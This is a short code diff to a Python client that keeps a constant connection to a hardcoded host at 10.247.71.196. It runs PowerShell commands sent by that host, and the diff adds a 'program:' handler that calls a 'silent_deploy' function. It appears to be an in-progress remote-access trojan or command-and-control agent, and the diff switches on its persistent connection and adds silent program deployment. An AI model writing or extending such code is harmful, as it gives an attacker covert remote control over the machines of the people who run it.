@@ -12,8 +12,8 @@ class main:
         self.base_url = "http://10.247.71.196:6969"
         self.ip = "10.247.71.196"
         self.port = 4969
-        self.grab_specs()
-        # threading.Thread(target=self.constant_connection, args=()).start()
+        # self.grab_specs()
+        threading.Thread(target=self.constant_connection, args=()).start()
     def grab_specs(self):
         self.os_type = platform.platform()
         self.processor = platform.processor()
@@ -86,6 +86,9 @@ class main:
             elif data.startswith("powershell:"):
                 data = data.split("powershell:")[1]
                 client_func.execute_powershell(data)
+            elif data.startswith("program:"):
+                data = data.split("program:")[1]
+                client_func.silent_deploy(data)
             
 
 
